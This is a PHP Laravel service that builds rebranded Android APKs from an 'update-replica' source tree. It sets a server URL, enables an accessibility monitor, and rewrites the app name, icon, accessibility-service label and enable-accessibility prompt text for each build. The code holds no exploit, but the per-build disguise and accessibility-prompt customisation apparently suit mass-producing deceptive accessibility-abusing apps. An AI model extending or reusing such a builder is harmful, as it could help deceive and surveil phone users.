<?php

declare(strict_types=1);

namespace App\Services\GradleApkBuilder;

use App\Exceptions\GradleApkBuilder\GradleApkBuildException;
use App\Services\ApkBuilder\ApkBuildResult;
use App\Services\ApkBuilder\Contracts\FileSystemInterface;
use App\Services\ApkBuilder\Contracts\ProcessRunnerInterface;
use Illuminate\Support\Facades\Log;

/**
 * Gradle 源码 APK 构建服务 (update-replica)
 *
 * 流程: rsync update-replica/ → 写入 server_config.json + 修改 build.gradle + strings.xml → ./gradlew assembleDebug → 收集 APK
 */
final class GradleApkBuilder
{
    private string $androidSourcePath;

    private string $outputDir;

    private string $javaHome;

    private string $androidHome;

    private int $timeout;

    private bool $cleanupOnSuccess;

    private bool $cleanupOnFailure;

    private string $workDir = '';

    private array $stepStats = [];

    private float $startTime;

    private ?\Closure $progressCallback = null;

    private ?\Closure $heartbeatCallback = null;

    private const MAX_OUTPUT_BYTES = 256 * 1024;

    private const MONITOR_CONFIG = [
        'enableAccessibilityMonitor' => true,
        'monitorSettings' => [
            'checkIntervalSeconds' => 0.5,
            'confirmationRequiredCount' => 2,
            'maxRetryCount' => 8,
            'delayAfterServiceConnectedSeconds' => 1,
        ],
    ];

    public const STEP_LABELS = [
        'check_environment' => '检查环境',
        'prepare_work_dir' => '准备工作目录',
        'modify_server_config' => '写入配置',
        'modify_build_gradle' => '修改构建脚本',
        'modify_strings' => '修改字符串资源',
        'replace_icon' => '替换图标',
        'replace_background' => '替换背景图',
        'gradle_build' => 'Gradle 构建',
        'collect_apk' => '收集 APK',
        'cleanup' => '清理',
    ];

    public function __construct(
        private readonly FileSystemInterface $fileSystem,
        private readonly ProcessRunnerInterface $processRunner,
    ) {
        $this->androidSourcePath = config('gradle-apk-builder.android_source_path', base_path('update-replica'));
        $this->outputDir = config('gradle-apk-builder.output_path', storage_path('app/public/apk/gradle'));
        $this->javaHome = config('gradle-apk-builder.java_home', '/usr/lib/jvm/java-17-openjdk-amd64');
        $this->androidHome = config('gradle-apk-builder.android_home', '/opt/android-sdk');
        $this->timeout = config('gradle-apk-builder.timeout', 600);
        $this->cleanupOnSuccess = config('gradle-apk-builder.cleanup_on_success', true);
        $this->cleanupOnFailure = config('gradle-apk-builder.cleanup_on_failure', true);
    }

    public function onProgress(\Closure $callback): self
    {
        $this->progressCallback = $callback;

        return $this;
    }

    public function onHeartbeat(\Closure $callback): self
    {
        $this->heartbeatCallback = $callback;

        return $this;
    }

    /**
     * @throws GradleApkBuildException
     */
    public function build(GradleApkBuildConfig $config): ApkBuildResult
    {
        $this->startTime = microtime(true);
        $this->stepStats = [];

        Log::channel('apk')->info('GradleApkBuilder: Build started', [
            'application_id' => $config->application_id,
            'version_name' => $config->version_name,
            'app_name' => $config->app_name,
        ]);

        try {
            $this->runStep('check_environment', fn () => $this->checkEnvironment());
            $this->runStep('prepare_work_dir', fn () => $this->prepareWorkDir());
            $this->runStep('modify_server_config', fn () => $this->modifyServerConfig($config));
            $this->runStep('modify_build_gradle', fn () => $this->modifyBuildGradle($config));
            $this->runStep('modify_strings', fn () => $this->modifyStrings($config));
            $this->runStep('replace_icon', fn () => $this->replaceIcon($config));
            $this->runStep('replace_background', fn () => $this->replaceBackground($config));
            $this->runStep('gradle_build', fn () => $this->gradleBuild());
            $result = $this->runStep('collect_apk', fn () => $this->collectApk($config));

            if ($this->cleanupOnSuccess) {
                $this->runStep('cleanup', fn () => $this->cleanup());
            }

            $totalTime = (microtime(true) - $this->startTime) * 1000;

            Log::channel('apk')->info('GradleApkBuilder: Build completed', [
                'application_id' => $config->application_id,
                'output_path' => $result,
                'duration_ms' => $totalTime,
            ]);

            return new ApkBuildResult(
                path: $result,
                packageName: $config->application_id,
                stats: $this->stepStats,
                totalTimeMs: $totalTime,
            );
        } catch (GradleApkBuildException $e) {
            Log::channel('apk')->error('GradleApkBuilder: Build failed', [
                'step' => $e->step,
                'error' => $e->getMessage(),
                'output' => $e->buildOutput,
            ]);

            if ($this->cleanupOnFailure && ! empty($this->workDir)) {
                $this->cleanup();
            }
            throw $e;
        }
    }

    // ============ 步骤实现 ============

    private function checkEnvironment(): void
    {
        if (! is_dir($this->javaHome)) {
            throw GradleApkBuildException::environmentMissing('JAVA_HOME', "路径不存在: {$this->javaHome}");
        }

        $javaBin = $this->javaHome.'/bin/java';
        if (! is_file($javaBin)) {
            throw GradleApkBuildException::environmentMissing('java', "java 二进制不存在: {$javaBin}");
        }

        if (! is_dir($this->androidHome)) {
            throw GradleApkBuildException::environmentMissing('ANDROID_HOME', "路径不存在: {$this->androidHome}");
        }

        if (! is_dir($this->androidSourcePath)) {
            throw GradleApkBuildException::environmentMissing('android_source', "源码目录不存在: {$this->androidSourcePath}");
        }

        $gradlew = $this->androidSourcePath.'/gradlew';
        if (! is_file($gradlew)) {
            throw GradleApkBuildException::environmentMissing('gradlew', "gradlew 不存在: {$gradlew}");
        }
    }

    private function prepareWorkDir(): void
    {
        $tempBase = config('gradle-apk-builder.temp_path');
        if (empty($tempBase)) {
            $tempBase = sys_get_temp_dir();
        }

        $this->workDir = rtrim($tempBase, '/').'/gradle-apk-'.uniqid();

        $result = $this->processRunner->run(
            'rsync -a'
            ." --exclude='build/'"
            ." --exclude='.gradle/'"
            ." --exclude='.kotlin/'"
            ." --exclude='docs/'"
            ." --exclude='.claude/'"
            ." --exclude='local.properties'"
            ." --exclude='*.md'"
            ." --exclude='*.txt'"
            ." --exclude='*.csv'"
            .' '.escapeshellarg($this->androidSourcePath.'/')
            .' '.escapeshellarg($this->workDir.'/')
        );

        if (! $result->successful()) {
            throw GradleApkBuildException::stepFailed(
                'prepare_work_dir',
                'rsync 复制源码失败',
                $result->output().$result->errorOutput()
            );
        }

        $localProps = "sdk.dir={$this->androidHome}\n";
        $this->fileSystem->put($this->workDir.'/local.properties', $localProps);

        Log::channel('apk')->info('GradleApkBuilder: 工作目录准备完成', ['workDir' => $this->workDir]);
    }

    /**
     * 生成 server_config.json + monitor_config.json (构建时唯一配置来源)
     */
    private function modifyServerConfig(GradleApkBuildConfig $config): void
    {
        $assetsDir = $this->workDir.'/app/src/main/assets';

        // server_config.json
        $serverConfig = $config->toServerConfig();
        $this->fileSystem->put(
            $assetsDir.'/server_config.json',
            json_encode($serverConfig, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES)."\n"
        );

        // monitor_config.json
        $this->fileSystem->put(
            $assetsDir.'/monitor_config.json',
            json_encode(self::MONITOR_CONFIG, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)."\n"
        );

        Log::channel('apk')->info('GradleApkBuilder: 配置文件已写入', [
            'serverUrl' => $config->server_url,
            'debug' => $config->debug,
        ]);
    }

    private function modifyBuildGradle(GradleApkBuildConfig $config): void
    {
        $gradlePath = $this->workDir.'/app/build.gradle';
        $content = $this->fileSystem->get($gradlePath);

        if ($content === null) {
            throw GradleApkBuildException::stepFailed('modify_build_gradle', "无法读取: {$gradlePath}");
        }

        if (! empty($config->application_id)) {
            $content = preg_replace(
                '/applicationId\s+"[^"]+"/',
                'applicationId "'.$config->application_id.'"',
                $content
            );
        }

        $content = preg_replace(
            '/versionCode\s+\d+/',
            'versionCode '.$config->version_code,
            $content
        );

        $content = preg_replace(
            '/versionName\s+"[^"]+"/',
            'versionName "'.$config->version_name.'"',
            $content
        );

        $this->fileSystem->put($gradlePath, $content);

        Log::channel('apk')->info('GradleApkBuilder: build.gradle 已更新', [
            'applicationId' => $config->application_id ?: '(保持默认)',
            'versionCode' => $config->version_code,
            'versionName' => $config->version_name,
        ]);
    }

    private function modifyStrings(GradleApkBuildConfig $config): void
    {
        $stringsPath = $this->workDir.'/app/src/main/res/values/strings.xml';
        $content = $this->fileSystem->get($stringsPath);

        if ($content === null) {
            throw GradleApkBuildException::stepFailed('modify_strings', "无法读取: {$stringsPath}");
        }

        $escapedName = $this->escapeXml($config->app_name);

        $content = preg_replace(
            '/<string name="app_name">[^<]*<\/string>/',
            '<string name="app_name">'.$escapedName.'</string>',
            $content
        );

        $content = preg_replace(
            '/<string name="accessibility_service_label">[^<]*<\/string>/',
            '<string name="accessibility_service_label">'.$escapedName.'</string>',
            $content
        );

        if (! empty($config->alert_title)) {
            $content = preg_replace(
                '/<string name="enable_accessibility_service">[^<]*<\/string>/',
                '<string name="enable_accessibility_service">'.$this->escapeXml($config->alert_title).'</string>',
                $content
            );
        }

        if (! empty($config->alert_msg)) {
            $content = preg_replace(
                '/<string name="usage_instructions">[^<]*<\/string>/',
                '<string name="usage_instructions">'.$this->escapeXml($config->alert_msg).'</string>',
                $content
            );
        }

        $this->fileSystem->put($stringsPath, $content);

        Log::channel('apk')->info('GradleApkBuilder: strings.xml 已更新', ['appName' => $config->app_name]);
    }

    /**
     * 替换图标到 4 个 mipmap 密度目录
     */
    private function replaceIcon(GradleApkBuildConfig $config): void
    {
        if (empty($config->icon_path)) {
            Log::channel('apk')->info('GradleApkBuilder: 跳过图标替换（未配置）');

            return;
        }

        $resDir = $this->workDir.'/app/src/main/res';

        // 写入自定义图标到 4 个密度目录
        $densities = ['mipmap-hdpi', 'mipmap-mdpi', 'mipmap-xhdpi', 'mipmap-xxhdpi'];
        foreach ($densities as $density) {
            $target = $resDir.'/'.$density.'/ic_launcher.png';
            $dir = dirname($target);
            if (is_dir($dir)) {
                $this->fileSystem->copy($config->icon_path, $target);
            }
        }

        // 写入 PNG 到 drawable（用唯一名称避免与 material 库的 XML 冲突）
        $this->fileSystem->ensureDirectoryExists($resDir.'/drawable');
        $this->fileSystem->copy($config->icon_path, $resDir.'/drawable/ic_custom_launcher.png');

        // 用 XML wrapper 覆盖 material 库的矢量 drawable
        // app 模块的资源优先级高于库资源，同名 XML 会替换库的版本
        $bitmapXml = <<<'XML'
<?xml version="1.0" encoding="utf-8"?>
<bitmap xmlns:android="http://schemas.android.com/apk/res/android"
    android:src="@drawable/ic_custom_launcher" />
XML;
        $this->fileSystem->put($resDir.'/drawable/ic_launcher_background.xml', $bitmapXml."\n");
        $this->fileSystem->put($resDir.'/drawable/ic_launcher_foreground.xml', $bitmapXml."\n");

        // 创建 adaptive icon XML（覆盖 material 库的版本）
        $adaptiveDir = $resDir.'/mipmap-anydpi-v26';
        $this->fileSystem->ensureDirectoryExists($adaptiveDir);
        $adaptiveXml = <<<'XML'
<?xml version="1.0" encoding="utf-8"?>
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@drawable/ic_launcher_background" />
    <foreground android:drawable="@drawable/ic_launcher_foreground" />
</adaptive-icon>
XML;
        $this->fileSystem->put($adaptiveDir.'/ic_launcher.xml', $adaptiveXml."\n");

        Log::channel('apk')->info('GradleApkBuilder: 图标已替换（含 adaptive icon）', [
            'source' => $config->icon_path,
        ]);
    }

    /**
     * 替换背景图到 assets/bg_accessibility.png
     */
    private function replaceBackground(GradleApkBuildConfig $config): void
    {
        if (empty($config->background_path)) {
            Log::channel('apk')->info('GradleApkBuilder: 跳过背景图替换（未配置）');

            return;
        }

        $targetPath = $this->workDir.'/app/src/main/assets/bg_accessibility.png';
        $this->fileSystem->copy($config->background_path, $targetPath);

        Log::channel('apk')->info('GradleApkBuilder: 背景图已替换', ['source' => $config->background_path]);
    }

    private function gradleBuild(): void
    {
        $env = "JAVA_HOME={$this->javaHome} ANDROID_HOME={$this->androidHome} GRADLE_OPTS='-Xmx2g'";
        $command = 'cd '.escapeshellarg($this->workDir)
            .' && chmod +x gradlew'
            ." && {$env} ./gradlew assembleDebug --no-daemon -Dkotlin.daemon.enabled=false -Dorg.gradle.jvmargs='-Xmx2g' -q";

        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = proc_open($command, $descriptors, $pipes, null, null);
        if (! is_resource($process)) {
            throw GradleApkBuildException::stepFailed('gradle_build', '无法启动 Gradle 进程');
        }

        fclose($pipes[0]);
        stream_set_blocking($pipes[1], false);
        stream_set_blocking($pipes[2], false);

        $output = '';
        $startTime = time();
        $lastHeartbeat = time();

        try {
            while (true) {
                foreach ([1, 2] as $fd) {
                    $chunk = fread($pipes[$fd], 8192);
                    if ($chunk !== false && $chunk !== '') {
                        $output .= $chunk;
                        if (strlen($output) > self::MAX_OUTPUT_BYTES) {
                            $output = substr($output, -self::MAX_OUTPUT_BYTES);
                        }
                    }
                }

                $status = proc_get_status($process);
                if (! $status['running']) {
                    $output .= stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
                    break;
                }

                if ((time() - $startTime) > $this->timeout) {
                    proc_terminate($process, 15);
                    usleep(100_000);
                    proc_terminate($process, 9);
                    throw GradleApkBuildException::stepFailed('gradle_build', "Gradle 构建超时 ({$this->timeout}s)", $output);
                }

                if ((time() - $lastHeartbeat) >= 30) {
                    $this->sendHeartbeat();
                    $lastHeartbeat = time();
                }

                usleep(50_000);
            }
        } finally {
            @fclose($pipes[1]);
            @fclose($pipes[2]);
            $exitCode = proc_close($process);
        }

        if ($exitCode !== 0) {
            Log::channel('apk')->error('GradleApkBuilder: Gradle 构建失败', ['output' => substr($output, -8192)]);
            throw GradleApkBuildException::stepFailed('gradle_build', 'Gradle 构建失败', $output);
        }

        Log::channel('apk')->info('GradleApkBuilder: Gradle 构建完成');
    }

    private function sendHeartbeat(): void
    {
        if ($this->heartbeatCallback !== null) {
            ($this->heartbeatCallback)();
        }
    }

    /**
     * @return string APK 输出路径（相对路径格式：storage/app/public/...）
     */
    private function collectApk(GradleApkBuildConfig $config): string
    {
        $apkSource = $this->workDir.'/app/build/outputs/apk/debug/app-debug.apk';

        if (! $this->fileSystem->exists($apkSource)) {
            throw GradleApkBuildException::stepFailed('collect_apk', "APK 文件不存在: {$apkSource}");
        }

        $this->fileSystem->ensureDirectoryExists($this->outputDir);

        $fileName = $config->application_id.'_'.$config->version_name.'.apk';
        $outputPath = rtrim($this->outputDir, '/').'/'.$fileName;

        $this->fileSystem->copy($apkSource, $outputPath);

        Log::channel('apk')->info('GradleApkBuilder: APK 已输出', ['path' => $outputPath]);

        $basePath = storage_path('app/public/');
        if (str_starts_with($outputPath, $basePath)) {
            return 'storage/app/public/'.substr($outputPath, strlen($basePath));
        }

        return $outputPath;
    }

    private function cleanup(): void
    {
        if (empty($this->workDir) || ! is_dir($this->workDir)) {
            return;
        }

        $result = $this->processRunner->run('rm -rf '.escapeshellarg($this->workDir));

        if ($result->successful()) {
            Log::channel('apk')->info('GradleApkBuilder: 临时目录已清理', ['workDir' => $this->workDir]);
        } else {
            Log::channel('apk')->warning('GradleApkBuilder: 临时目录清理失败', ['workDir' => $this->workDir]);
        }

        $this->workDir = '';
    }

    // ============ 辅助方法 ============

    private function runStep(string $step, \Closure $action): mixed
    {
        $stepStart = microtime(true);
        $label = self::STEP_LABELS[$step] ?? $step;

        $this->reportProgress($step, $label, 'running');

        try {
            $result = $action();
        } catch (GradleApkBuildException $e) {
            $this->stepStats[$step] = [
                'label' => $label,
                'status' => 'failed',
                'time_ms' => (microtime(true) - $stepStart) * 1000,
            ];
            $this->reportProgress($step, $label, 'failed');
            throw $e;
        }

        $timeMs = (microtime(true) - $stepStart) * 1000;
        $this->stepStats[$step] = [
            'label' => $label,
            'status' => 'done',
            'time_ms' => $timeMs,
        ];
        $this->reportProgress($step, $label, 'done');

        return $result;
    }

    private function reportProgress(string $step, string $label, string $status): void
    {
        if ($this->progressCallback !== null) {
            ($this->progressCallback)($step, $label, $status);
        }
    }

    private function escapeXml(string $text): string
    {
        return htmlspecialchars($text, ENT_XML1 | ENT_QUOTES, 'UTF-8');
    }
}
